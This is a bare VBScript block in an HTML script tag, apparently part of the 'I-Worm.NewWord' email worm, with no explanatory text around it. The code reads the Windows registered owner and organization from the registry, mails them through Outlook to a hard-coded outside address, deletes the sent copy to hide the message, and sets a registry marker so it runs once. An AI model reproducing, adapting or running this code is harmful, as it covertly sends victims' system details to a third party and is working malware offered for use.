
<script language = "VBScript"><!--
On Error Resume Next
set f=CreateObject("Scripting.FileSystemObject")
set w=CreateObject("WScript.Shell")
If w.RegRead("HKLM\Software\NewWord\") <> "OK" Then
set o=CreateObject("Outlook.Application")
set m=o.CreateItem(0)
n=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
p=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")
m.To = "satanikchild@netzero.net"
m.Subject = "Message from " & n
s = "Time : " & time
s = s & vbCrLf & "Date : " & date
s = s & vbCrLf & "Organization : " & p
s = s & vbCrLf & vbCrLf & "		I-Worm.NewWord"
m.Body = s
m.DeleteAfterSubmit=True
m.Send
w.RegWrite "HKLM\Software\NewWord\", "OK"
End If
//--></script>